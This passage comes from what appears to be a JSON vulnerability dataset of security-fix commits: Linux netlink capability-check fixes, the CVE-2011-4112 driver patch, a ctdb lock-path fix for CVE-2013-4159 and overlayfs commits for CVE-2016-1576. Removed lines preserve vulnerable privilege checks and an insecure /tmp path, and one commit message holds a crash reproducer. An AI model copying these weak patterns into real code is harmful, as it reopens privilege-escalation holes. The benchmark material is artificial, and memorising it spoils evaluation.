a\/net\/dcb\/dcbnl.c b\/net\/dcb\/dcbnl.c\nindex 553644402670..f8b98d89c285 100644\n--- a\/net\/dcb\/dcbnl.c\n+++ b\/net\/dcb\/dcbnl.c\n@@ -1669,7 +1669,7 @@ static int dcb_doit(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tstruct nlmsghdr *reply_nlh = NULL;\n \tconst struct reply_func *fn;\n \n-\tif ((nlh->nlmsg_type == RTM_SETDCB) && !capable(CAP_NET_ADMIN))\n+\tif ((nlh->nlmsg_type == RTM_SETDCB) && !netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tret = nlmsg_parse(nlh, sizeof(*dcb), tb, DCB_ATTR_MAX,\ndiff --git a\/net\/decnet\/dn_dev.c b\/net\/decnet\/dn_dev.c\nindex a603823a3e27..3b726f31c64c 100644\n--- a\/net\/decnet\/dn_dev.c\n+++ b\/net\/decnet\/dn_dev.c\n@@ -574,7 +574,7 @@ static int dn_nl_deladdr(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tstruct dn_ifaddr __rcu **ifap;\n \tint err = -EINVAL;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (!net_eq(net, &init_net))\n@@ -618,7 +618,7 @@ static int dn_nl_newaddr(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tstruct dn_ifaddr *ifa;\n \tint err;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (!net_eq(net, &init_net))\ndiff --git a\/net\/decnet\/dn_fib.c b\/net\/decnet\/dn_fib.c\nindex 57dc159245ec..d332aefb0846 100644\n--- a\/net\/decnet\/dn_fib.c\n+++ b\/net\/decnet\/dn_fib.c\n@@ -505,7 +505,7 @@ static int dn_fib_rtm_delroute(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tstruct nlattr *attrs[RTA_MAX+1];\n \tint err;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (!net_eq(net, &init_net))\n@@ -530,7 +530,7 @@ static int dn_fib_rtm_newroute(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tstruct nlattr *attrs[RTA_MAX+1];\n \tint err;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif (!net_eq(net, &init_net))\ndiff --git a\/net\/decnet\/netfilter\/dn_rtmsg.c b\/net\/decnet\/netfilter\/dn_rtmsg.c\nindex e83015cecfa7..e4d9560a910b 100644\n--- a\/net\/decnet\/netfilter\/dn_rtmsg.c\n+++ b\/net\/decnet\/netfilter\/dn_rtmsg.c\n@@ -107,7 +107,7 @@ static inline void dnrmg_receive_user_skb(struct sk_buff *skb)\n \tif (nlh->nlmsg_len < sizeof(*nlh) || skb->len < nlh->nlmsg_len)\n \t\treturn;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\tRCV_SKB_FAIL(-EPERM);\n \n \t\/* Eventually we might send routing messages too *\/\ndiff --git a\/net\/netfilter\/nfnetlink.c b\/net\/netfilter\/nfnetlink.c\nindex e8138da4c14f..84392f3237c1 100644\n--- a\/net\/netfilter\/nfnetlink.c\n+++ b\/net\/netfilter\/nfnetlink.c\n@@ -375,7 +375,7 @@ static void nfnetlink_rcv(struct sk_buff *skb)\n \t    skb->len < nlh->nlmsg_len)\n \t\treturn;\n \n-\tif (!ns_capable(net->user_ns, CAP_NET_ADMIN)) {\n+\tif (!netlink_net_capable(skb, CAP_NET_ADMIN)) {\n \t\tnetlink_ack(skb, nlh, -EPERM);\n \t\treturn;\n \t}\ndiff --git a\/net\/netlink\/genetlink.c b\/net\/netlink\/genetlink.c\nindex b1dcdb932a86..a3ba3ca0ff92 100644\n--- a\/net\/netlink\/genetlink.c\n+++ b\/net\/netlink\/genetlink.c\n@@ -561,7 +561,7 @@ static int genl_family_rcv_msg(struct genl_family *family,\n \t\treturn -EOPNOTSUPP;\n \n \tif ((ops->flags & GENL_ADMIN_PERM) &&\n-\t    !capable(CAP_NET_ADMIN))\n+\t    !netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif ((nlh->nlmsg_flags & NLM_F_DUMP) == NLM_F_DUMP) {\ndiff --git a\/net\/packet\/diag.c b\/net\/packet\/diag.c\nindex b34d0de24091..92f2c7107eec 100644\n--- a\/net\/packet\/diag.c\n+++ b\/net\/packet\/diag.c\n@@ -194,7 +194,7 @@ static int packet_diag_dump(struct sk_buff *skb, struct netlink_callback *cb)\n \n \tnet = sock_net(skb->sk);\n \treq = nlmsg_data(cb->nlh);\n-\tmay_report_filterinfo = ns_capable(net->user_ns, CAP_NET_ADMIN);\n+\tmay_report_filterinfo = netlink_net_capable(cb->skb, CAP_NET_ADMIN);\n \n \tmutex_lock(&net->packet.sklist_lock);\n \tsk_for_each(sk, &net->packet.sklist) {\ndiff --git a\/net\/phonet\/pn_netlink.c b\/net\/phonet\/pn_netlink.c\nindex dc15f4300808..b64151ade6b3 100644\n--- a\/net\/phonet\/pn_netlink.c\n+++ b\/net\/phonet\/pn_netlink.c\n@@ -70,10 +70,10 @@ static int addr_doit(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tint err;\n \tu8 pnaddr;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n-\tif (!capable(CAP_SYS_ADMIN))\n+\tif (!netlink_capable(skb, CAP_SYS_ADMIN))\n \t\treturn -EPERM;\n \n \tASSERT_RTNL();\n@@ -233,10 +233,10 @@ static int route_doit(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tint err;\n \tu8 dst;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n-\tif (!capable(CAP_SYS_ADMIN))\n+\tif (!netlink_capable(skb, CAP_SYS_ADMIN))\n \t\treturn -EPERM;\n \n \tASSERT_RTNL();\ndiff --git a\/net\/sched\/act_api.c b\/net\/sched\/act_api.c\nindex 8a5ba5add4bc..648778aef1a2 100644\n--- a\/net\/sched\/act_api.c\n+++ b\/net\/sched\/act_api.c\n@@ -948,7 +948,7 @@ static int tc_ctl_action(struct sk_buff *skb, struct nlmsghdr *n)\n \tu32 portid = skb ? NETLINK_CB(skb).portid : 0;\n \tint ret = 0, ovr = 0;\n \n-\tif ((n->nlmsg_type != RTM_GETACTION) && !capable(CAP_NET_ADMIN))\n+\tif ((n->nlmsg_type != RTM_GETACTION) && !netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tret = nlmsg_parse(n, sizeof(struct tcamsg), tca, TCA_ACT_MAX, NULL);\ndiff --git a\/net\/sched\/cls_api.c b\/net\/sched\/cls_api.c\nindex 29a30a14c315..bdbdb1a7920a 100644\n--- a\/net\/sched\/cls_api.c\n+++ b\/net\/sched\/cls_api.c\n@@ -134,7 +134,7 @@ static int tc_ctl_tfilter(struct sk_buff *skb, struct nlmsghdr *n)\n \tint err;\n \tint tp_created = 0;\n \n-\tif ((n->nlmsg_type != RTM_GETTFILTER) && !capable(CAP_NET_ADMIN))\n+\tif ((n->nlmsg_type != RTM_GETTFILTER) && !netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n replay:\ndiff --git a\/net\/sched\/sch_api.c b\/net\/sched\/sch_api.c\nindex a0b84e0e22de..400769014bbd 100644\n--- a\/net\/sched\/sch_api.c\n+++ b\/net\/sched\/sch_api.c\n@@ -1084,7 +1084,7 @@ static int tc_get_qdisc(struct sk_buff *skb, struct nlmsghdr *n)\n \tstruct Qdisc *p = NULL;\n \tint err;\n \n-\tif ((n->nlmsg_type != RTM_GETQDISC) && !capable(CAP_NET_ADMIN))\n+\tif ((n->nlmsg_type != RTM_GETQDISC) && !netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \terr = nlmsg_parse(n, sizeof(*tcm), tca, TCA_MAX, NULL);\n@@ -1151,7 +1151,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n)\n \tstruct Qdisc *q, *p;\n \tint err;\n \n-\tif (!capable(CAP_NET_ADMIN))\n+\tif (!netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n replay:\n@@ -1490,7 +1490,7 @@ static int tc_ctl_tclass(struct sk_buff *skb, struct nlmsghdr *n)\n \tu32 qid;\n \tint err;\n \n-\tif ((n->nlmsg_type != RTM_GETTCLASS) && !capable(CAP_NET_ADMIN))\n+\tif ((n->nlmsg_type != RTM_GETTCLASS) && !netlink_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \terr = nlmsg_parse(n, sizeof(*tcm), tca, TCA_MAX, NULL);\ndiff --git a\/net\/tipc\/netlink.c b\/net\/tipc\/netlink.c\nindex 3aaf73de9e2d..ad844d365340 100644\n--- a\/net\/tipc\/netlink.c\n+++ b\/net\/tipc\/netlink.c\n@@ -47,7 +47,7 @@ static int handle_cmd(struct sk_buff *skb, struct genl_info *info)\n \tint hdr_space = nlmsg_total_size(GENL_HDRLEN + TIPC_GENL_HDRLEN);\n \tu16 cmd;\n \n-\tif ((req_userhdr->cmd & 0xC000) && (!capable(CAP_NET_ADMIN)))\n+\tif ((req_userhdr->cmd & 0xC000) && (!netlink_capable(skb, CAP_NET_ADMIN)))\n \t\tcmd = TIPC_CMD_NOT_NET_ADMIN;\n \telse\n \t\tcmd = req_userhdr->cmd;\ndiff --git a\/net\/xfrm\/xfrm_user.c b\/net\/xfrm\/xfrm_user.c\nindex 8f131c10a6f3..51398ae6cda8 100644\n--- a\/net\/xfrm\/xfrm_user.c\n+++ b\/net\/xfrm\/xfrm_user.c\n@@ -2377,7 +2377,7 @@ static int xfrm_user_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh)\n \tlink = &xfrm_dispatch[type];\n \n \t\/* All operations require privileges, even GET *\/\n-\tif (!ns_capable(net->user_ns, CAP_NET_ADMIN))\n+\tif (!netlink_net_capable(skb, CAP_NET_ADMIN))\n \t\treturn -EPERM;\n \n \tif ((type == (XFRM_MSG_GETSA - XFRM_MSG_BASE) ||\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"mjg59","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-4112","CWE_ID":"264","category":"security","commit_id":"550fd08c2cebad61c548def135f67aba284c6162","commit_message":"From 550fd08c2cebad61c548def135f67aba284c6162 Mon Sep 17 00:00:00 2001\nFrom: Neil Horman <nhorman@tuxdriver.com>\nDate: Tue, 26 Jul 2011 06:05:38 +0000\nSubject: net: Audit drivers to identify those needing IFF_TX_SKB_SHARING\n cleared\n\nAfter the last patch, We are left in a state in which only drivers calling\nether_setup have IFF_TX_SKB_SHARING set (we assume that drivers touching real\nhardware call ether_setup for their net_devices and don't hold any state in\ntheir skbs.  There are a handful of drivers that violate this assumption of\ncourse, and need to be fixed up.  This patch identifies those drivers, and marks\nthem as not being able to support the safe transmission of skbs by clearning the\nIFF_TX_SKB_SHARING flag in priv_flags\n\nSigned-off-by: Neil Horman <nhorman@tuxdriver.com>\nCC: Karsten Keil <isdn@linux-pingi.de>\nCC: \"David S. Miller\" <davem@davemloft.net>\nCC: Jay Vosburgh <fubar@us.ibm.com>\nCC: Andy Gospodarek <andy@greyhouse.net>\nCC: Patrick McHardy <kaber@trash.net>\nCC: Krzysztof Halasa <khc@pm.waw.pl>\nCC: \"John W. Linville\" <linville@tuxdriver.com>\nCC: Greg Kroah-Hartman <gregkh@suse.de>\nCC: Marcel Holtmann <marcel@holtmann.org>\nCC: Johannes Berg <johannes@sipsolutions.net>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers\/isdn\/i4l\/isdn_net.c                  | 3 +++\n drivers\/net\/bonding\/bond_main.c              | 6 ++++--\n drivers\/net\/ifb.c                            | 2 +-\n drivers\/net\/macvlan.c                        | 2 +-\n drivers\/net\/tun.c                            | 1 +\n drivers\/net\/veth.c                           | 2 ++\n drivers\/net\/wan\/hdlc_fr.c                    | 5 +++--\n drivers\/net\/wireless\/airo.c                  | 1 +\n drivers\/net\/wireless\/hostap\/hostap_main.c    | 1 +\n drivers\/staging\/ath6kl\/os\/linux\/ar6000_drv.c | 1 +\n net\/8021q\/vlan_dev.c                         | 2 +-\n net\/bluetooth\/bnep\/netdev.c                  | 1 +\n net\/l2tp\/l2tp_eth.c                          | 2 +-\n net\/mac80211\/iface.c                         | 1 +\n 14 files changed, 22 insertions(+), 8 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/isdn\/i4l\/isdn_net.c b\/drivers\/isdn\/i4l\/isdn_net.c\nindex 48e9cc0369b1..1f73d7f7e024 100644\n--- a\/drivers\/isdn\/i4l\/isdn_net.c\n+++ b\/drivers\/isdn\/i4l\/isdn_net.c\n@@ -2532,6 +2532,9 @@ static void _isdn_setup(struct net_device *dev)\n \n \t\/* Setup the generic properties *\/\n \tdev->flags = IFF_NOARP|IFF_POINTOPOINT;\n+\n+\t\/* isdn prepends a header in the tx path, can't share skbs *\/\n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \tdev->header_ops = NULL;\n \tdev->netdev_ops = &isdn_netdev_ops;\n \ndiff --git a\/drivers\/net\/bonding\/bond_main.c b\/drivers\/net\/bonding\/bond_main.c\nindex 02842d05c11f..df21e84f8198 100644\n--- a\/drivers\/net\/bonding\/bond_main.c\n+++ b\/drivers\/net\/bonding\/bond_main.c\n@@ -1557,8 +1557,10 @@ int bond_enslave(struct net_device *bond_dev, struct net_device *slave_dev)\n \n \t\t\tif (slave_dev->type != ARPHRD_ETHER)\n \t\t\t\tbond_setup_by_slave(bond_dev, slave_dev);\n-\t\t\telse\n+\t\t\telse {\n \t\t\t\tether_setup(bond_dev);\n+\t\t\t\tbond_dev->priv_flags &= ~IFF_TX_SKB_SHARING;\n+\t\t\t}\n \n \t\t\tnetdev_bonding_change(bond_dev,\n \t\t\t\t\t      NETDEV_POST_TYPE_CHANGE);\n@@ -4330,7 +4332,7 @@ static void bond_setup(struct net_device *bond_dev)\n \tbond_dev->tx_queue_len = 0;\n \tbond_dev->flags |= IFF_MASTER|IFF_MULTICAST;\n \tbond_dev->priv_flags |= IFF_BONDING;\n-\tbond_dev->priv_flags &= ~IFF_XMIT_DST_RELEASE;\n+\tbond_dev->priv_flags &= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);\n \n \t\/* At first, we block adding VLANs. That's the only way to\n \t * prevent problems that occur when adding VLANs over an\ndiff --git a\/drivers\/net\/ifb.c b\/drivers\/net\/ifb.c\nindex 6e82dd32e806..46b5f5fd686b 100644\n--- a\/drivers\/net\/ifb.c\n+++ b\/drivers\/net\/ifb.c\n@@ -183,7 +183,7 @@ static void ifb_setup(struct net_device *dev)\n \n \tdev->flags |= IFF_NOARP;\n \tdev->flags &= ~IFF_MULTICAST;\n-\tdev->priv_flags &= ~IFF_XMIT_DST_RELEASE;\n+\tdev->priv_flags &= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);\n \trandom_ether_addr(dev->dev_addr);\n }\n \ndiff --git a\/drivers\/net\/macvlan.c b\/drivers\/net\/macvlan.c\nindex ba631fcece34..05172c39a0ce 100644\n--- a\/drivers\/net\/macvlan.c\n+++ b\/drivers\/net\/macvlan.c\n@@ -572,7 +572,7 @@ void macvlan_common_setup(struct net_device *dev)\n {\n \tether_setup(dev);\n \n-\tdev->priv_flags\t       &= ~IFF_XMIT_DST_RELEASE;\n+\tdev->priv_flags\t       &= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);\n \tdev->netdev_ops\t\t= &macvlan_netdev_ops;\n \tdev->destructor\t\t= free_netdev;\n \tdev->header_ops\t\t= &macvlan_hard_header_ops,\ndiff --git a\/drivers\/net\/tun.c b\/drivers\/net\/tun.c\nindex 9a6b3824da14..71f3d1a35b74 100644\n--- a\/drivers\/net\/tun.c\n+++ b\/drivers\/net\/tun.c\n@@ -528,6 +528,7 @@ static void tun_net_init(struct net_device *dev)\n \t\tdev->netdev_ops = &tap_netdev_ops;\n \t\t\/* Ethernet TAP Device *\/\n \t\tether_setup(dev);\n+\t\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \n \t\trandom_ether_addr(dev->dev_addr);\n \ndiff --git a\/drivers\/net\/veth.c b\/drivers\/net\/veth.c\nindex 7f78db7bd68d..5b23767ea817 100644\n--- a\/drivers\/net\/veth.c\n+++ b\/drivers\/net\/veth.c\n@@ -263,6 +263,8 @@ static void veth_setup(struct net_device *dev)\n {\n \tether_setup(dev);\n \n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n+\n \tdev->netdev_ops = &veth_netdev_ops;\n \tdev->ethtool_ops = &veth_ethtool_ops;\n \tdev->features |= NETIF_F_LLTX;\ndiff --git a\/drivers\/net\/wan\/hdlc_fr.c b\/drivers\/net\/wan\/hdlc_fr.c\nindex b25c9229a6a9..eb2028187fbe 100644\n--- a\/drivers\/net\/wan\/hdlc_fr.c\n+++ b\/drivers\/net\/wan\/hdlc_fr.c\n@@ -1074,9 +1074,10 @@ static int fr_add_pvc(struct net_device *frad, unsigned int dlci, int type)\n \n \tused = pvc_is_used(pvc);\n \n-\tif (type == ARPHRD_ETHER)\n+\tif (type == ARPHRD_ETHER) {\n \t\tdev = alloc_netdev(0, \"pvceth%d\", ether_setup);\n-\telse\n+\t\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n+\t} else\n \t\tdev = alloc_netdev(0, \"pvc%d\", pvc_setup);\n \n \tif (!dev) {\ndiff --git a\/drivers\/net\/wireless\/airo.c b\/drivers\/net\/wireless\/airo.c\nindex 55cf71fbffe3..e1b3e3c134fd 100644\n--- a\/drivers\/net\/wireless\/airo.c\n+++ b\/drivers\/net\/wireless\/airo.c\n@@ -2823,6 +2823,7 @@ static struct net_device *_init_airo_card( unsigned short irq, int port,\n \tdev->wireless_data = &ai->wireless_data;\n \tdev->irq = irq;\n \tdev->base_addr = port;\n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \n \tSET_NETDEV_DEV(dev, dmdev);\n \ndiff --git a\/drivers\/net\/wireless\/hostap\/hostap_main.c b\/drivers\/net\/wireless\/hostap\/hostap_main.c\nindex d5084829c9e5..89a116fba1de 100644\n--- a\/drivers\/net\/wireless\/hostap\/hostap_main.c\n+++ b\/drivers\/net\/wireless\/hostap\/hostap_main.c\n@@ -855,6 +855,7 @@ void hostap_setup_dev(struct net_device *dev, local_info_t *local,\n \n \tiface = netdev_priv(dev);\n \tether_setup(dev);\n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \n \t\/* kernel callbacks *\/\n \tif (iface) {\ndiff --git a\/drivers\/staging\/ath6kl\/os\/linux\/ar6000_drv.c b\/drivers\/staging\/ath6kl\/os\/linux\/ar6000_drv.c\nindex 48dd9e363596..8ff52899ddee 100644\n--- a\/drivers\/staging\/ath6kl\/os\/linux\/ar6000_drv.c\n+++ b\/drivers\/staging\/ath6kl\/os\/linux\/ar6000_drv.c\n@@ -6179,6 +6179,7 @@ int ar6000_create_ap_interface(struct ar6_softc *ar, char *ap_ifname)\n     \n     ether_setup(dev);\n     init_netdev(dev, ap_ifname);\n+    dev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \n     if (register_netdev(dev)) {\n         AR_DEBUG_PRINTF(ATH_DEBUG_ERR,(\"ar6000_create_ap_interface: register_netdev failed\\n\"));\ndiff --git a\/net\/8021q\/vlan_dev.c b\/net\/8021q\/vlan_dev.c\nindex 934e221c1d07..9d40a071d038 100644\n--- a\/net\/8021q\/vlan_dev.c\n+++ b\/net\/8021q\/vlan_dev.c\n@@ -695,7 +695,7 @@ void vlan_setup(struct net_device *dev)\n \tether_setup(dev);\n \n \tdev->priv_flags\t\t|= IFF_802_1Q_VLAN;\n-\tdev->priv_flags\t\t&= ~IFF_XMIT_DST_RELEASE;\n+\tdev->priv_flags\t\t&= ~(IFF_XMIT_DST_RELEASE | IFF_TX_SKB_SHARING);\n \tdev->tx_queue_len\t= 0;\n \n \tdev->netdev_ops\t\t= &vlan_netdev_ops;\ndiff --git a\/net\/bluetooth\/bnep\/netdev.c b\/net\/bluetooth\/bnep\/netdev.c\nindex 8c100c9dae28..d4f5dff7c955 100644\n--- a\/net\/bluetooth\/bnep\/netdev.c\n+++ b\/net\/bluetooth\/bnep\/netdev.c\n@@ -231,6 +231,7 @@ void bnep_net_setup(struct net_device *dev)\n \tdev->addr_len = ETH_ALEN;\n \n \tether_setup(dev);\n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \tdev->netdev_ops = &bnep_netdev_ops;\n \n \tdev->watchdog_timeo  = HZ * 2;\ndiff --git a\/net\/l2tp\/l2tp_eth.c b\/net\/l2tp\/l2tp_eth.c\nindex a8193f52c13c..d2726a74597d 100644\n--- a\/net\/l2tp\/l2tp_eth.c\n+++ b\/net\/l2tp\/l2tp_eth.c\n@@ -103,7 +103,7 @@ static struct net_device_ops l2tp_eth_netdev_ops = {\n static void l2tp_eth_dev_setup(struct net_device *dev)\n {\n \tether_setup(dev);\n-\n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \tdev->netdev_ops\t\t= &l2tp_eth_netdev_ops;\n \tdev->destructor\t\t= free_netdev;\n }\ndiff --git a\/net\/mac80211\/iface.c b\/net\/mac80211\/iface.c\nindex cd5fb40d3fd4..556e7e6ddf0a 100644\n--- a\/net\/mac80211\/iface.c\n+++ b\/net\/mac80211\/iface.c\n@@ -698,6 +698,7 @@ static const struct net_device_ops ieee80211_monitorif_ops = {\n static void ieee80211_if_setup(struct net_device *dev)\n {\n \tether_setup(dev);\n+\tdev->priv_flags &= ~IFF_TX_SKB_SHARING;\n \tdev->netdev_ops = &ieee80211_dataif_ops;\n \tdev->destructor = free_netdev;\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2013-4159","CWE_ID":"264","category":"security","commit_id":"b9b9f6738fba5c32e87cb9c36b358355b444fb9b","commit_message":"From b9b9f6738fba5c32e87cb9c36b358355b444fb9b Mon Sep 17 00:00:00 2001\nFrom: Amitay Isaacs <amitay@gmail.com>\nDate: Thu, 3 Oct 2013 15:13:41 +1000\nSubject: [PATCH] tcp: Create socket lock in \/var\/run\/ctdb instead of \/tmp\n\nSigned-off-by: Amitay Isaacs <amitay@gmail.com>\nPair-programmed-with: Martin Schwenke <martin@meltin.net>\n---\n tcp\/tcp_connect.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/tcp\/tcp_connect.c b\/tcp\/tcp_connect.c\nindex 383d7264..9df33000 100644\n--- a\/tcp\/tcp_connect.c\n+++ b\/tcp\/tcp_connect.c\n@@ -284,7 +284,7 @@ static int ctdb_tcp_listen_automatic(struct ctdb_context *ctdb)\n \t\t\t\t\t\tstruct ctdb_tcp);\n         ctdb_sock_addr sock;\n \tint lock_fd, i;\n-\tconst char *lock_path = \"\/tmp\/.ctdb_socket_lock\";\n+\tconst char *lock_path = VARDIR \"\/run\/ctdb\/.socket_lock\";\n \tstruct flock lock;\n \tint one = 1;\n \tint sock_size;\n-- \n2.17.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-1576","CWE_ID":"264","category":"security","commit_id":"8d3095f4ad47ac409440a0ba1c80e13519ff867d","commit_message":"From 8d3095f4ad47ac409440a0ba1c80e13519ff867d Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Mon, 12 Oct 2015 17:11:44 +0200\nSubject: ovl: default permissions\n\nAdd mount option \"default_permissions\" to alter the way permissions are\ncalculated.\n\nWithout this option and prior to this patch permissions were calculated by\nunderlying lower or upper filesystem.\n\nWith this option the permissions are calculated by overlayfs based on the\nfile owner, group and mode bits.\n\nThis has significance for example when a read-only exported NFS filesystem\nis used as a lower layer.  In this case the underlying NFS filesystem will\nreply with EROFS, in which case all we know is that the filesystem is\nread-only.  But that's not what we are interested in, we are interested in\nwhether the access would be allowed if the filesystem wasn't read-only; the\nserver doesn't tell us that, and would need updating at various levels,\nwhich doesn't seem practicable.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\n---\n fs\/overlayfs\/inode.c     | 23 +++++++++++++++++++++++\n fs\/overlayfs\/overlayfs.h |  3 +++\n fs\/overlayfs\/super.c     | 28 ++++++++++++++++++++++++++++\n 3 files changed, 54 insertions(+)\n\nFrom 97daf8b97ad6f913a34c82515be64dc9ac08d63e Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Tue, 10 Nov 2015 17:08:41 +0100\nSubject: ovl: allow zero size xattr\n\nWhen ovl_copy_xattr() encountered a zero size xattr no more xattrs were\ncopied and the function returned success.  This is clearly not the desired\nbehavior.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/copy_up.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\nFrom e4ad29fa0d224d05e08b2858e65f112fd8edd4fe Mon Sep 17 00:00:00 2001\nFrom: Vito Caputo <vito.caputo@coreos.com>\nDate: Sat, 24 Oct 2015 07:19:46 -0500\nSubject: ovl: use a minimal buffer in ovl_copy_xattr\n\nRather than always allocating the high-order XATTR_SIZE_MAX buffer\nwhich is costly and prone to failure, only allocate what is needed and\nrealloc if necessary.\n\nFixes https:\/\/github.com\/coreos\/bugs\/issues\/489\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/copy_up.c | 39 +++++++++++++++++++++++++--------------\n 1 file changed, 25 insertions(+), 14 deletions(-)\n\nFrom 257f871993474e2bde6c497b54022c362cf398e1 Mon Sep 17 00:00:00 2001\nFrom: Stephen Hemminger <stephen@networkplumber.org>\nDate: Wed, 4 Nov 2015 10:59:52 -0800\nSubject: ovl: move super block magic number to magic.h\n\nThe overlayfs file system is not recognized by programs\nlike tail because the magic number is not in standard header location.\n\nMove it so that the value will propagate on for the GNU library\nand utilities. Needs to go in the fstatfs manual page as well.\n\nSigned-off-by: Stephen Hemminger <stephen@networkplumber.org>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\n---\n fs\/overlayfs\/super.c       | 2 --\n include\/uapi\/linux\/magic.h | 1 +\n 2 files changed, 1 insertion(+), 2 deletions(-)\n\nFrom ed06e069775ad9236087594a1c1667367e983fb5 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Wed, 9 Dec 2015 16:11:59 +0100\nSubject: ovl: root: copy attr\n\nWe copy i_uid and i_gid of underlying inode into overlayfs inode.  Except\nfor the root inode.\n\nFix this omission.\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/super.c | 3 +++\n 1 file changed, 3 insertions(+)\n\nFrom cf9a6784f7c1b5ee2b9159a1246e327c331c5697 Mon Sep 17 00:00:00 2001\nFrom: Miklos Szeredi <miklos@szeredi.hu>\nDate: Fri, 11 Dec 2015 16:30:49 +0100\nSubject: ovl: setattr: check permissions before copy-up\n\nWithout this copy-up of a file can be forced, even without actually being\nallowed to do anything on the file.\n\n[Arnd Bergmann] include <linux\/pagemap.h> for PAGE_CACHE_SIZE (used by\nMAX_LFS_FILESIZE definition).\n\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org>\n---\n fs\/overlayfs\/inode.c | 13 +++++++++++++\n fs\/overlayfs\/super.c |  2 ++\n 2 files changed, 15 insertions(+)\n\nFrom 84889d49335627bc770b32787c1ef9ebad1da232 Mon Sep 17 00:00:00 2001\nFrom: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>\nDate: Mon, 16 Nov 2015 18:44:11 +0300\nSubject: ovl: check dentry positiveness in ovl_cleanup_whiteouts()\n\nThis patch fixes kernel crash at removing directory which contains\nwhiteouts from lower layers.\n\nCache of directory content passed as \"list\" contains entries from all\nlayers, including whiteouts from lower layers. So, lookup in upper dir\n(moved into work at this stage) will return negative entry. Plus this\ncache is filled long before and we can race with external removal.\n\nExample:\n mkdir -p lower0\/dir lower1\/dir upper work overlay\n touch lower0\/dir\/a lower0\/dir\/b\n mknod lower1\/dir\/a c 0 0\n mount -t overlay none overlay -o lowerdir=lower1:lower0,upperdir=upper,workdir=work\n rm -fr overlay\/dir\n\nSigned-off-by: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>\nSigned-off-by: Miklos Szeredi <miklos@szeredi.hu>\nCc: <stable@vger.kernel.org> # 3.18+\n---\n fs\/overlayfs\/readdir.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/fs\/overlayfs\/inode.c b\/fs\/overlayfs\/inode.c\nindex ec0c2a050043..76546314e35f 100644\n--- a\/fs\/overlayfs\/inode.c\n+++ b\/fs\/overlayfs\/inode.c\n@@ -98,6 +98,29 @@ int ovl_permission(struct inode *inode, int mask)\n \n \trealdentry = ovl_entry_real(oe, &is_upper);\n \n+\tif 